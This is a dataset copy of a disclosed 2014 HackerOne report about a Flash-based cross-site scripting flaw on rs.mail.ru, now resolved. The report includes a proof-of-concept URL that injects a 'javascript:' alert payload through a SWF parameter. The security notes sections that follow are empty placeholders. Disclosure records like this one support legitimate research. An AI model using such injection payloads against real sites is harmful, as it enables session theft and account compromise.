---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8375'
original_report_id: '8375'
title: rs.mail.ru - Flash Based XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-04-21T08:39:12.987Z'
disclosed_at: '2014-08-07T16:07:28.638Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# rs.mail.ru - Flash Based XSS

## Metadata

- HackerOne Report ID: 8375
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2014-08-07T16:07:28.638Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I found a flash based XSS in rs.mail.ru.
Vulnerable link:
http://rs.mail.ru/b27161485.swf?link1=javascript:alert(document.domain)
Just click on the page and you will see the alert.
Tested on Mozilla Firefox
Regards,
  Florin

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
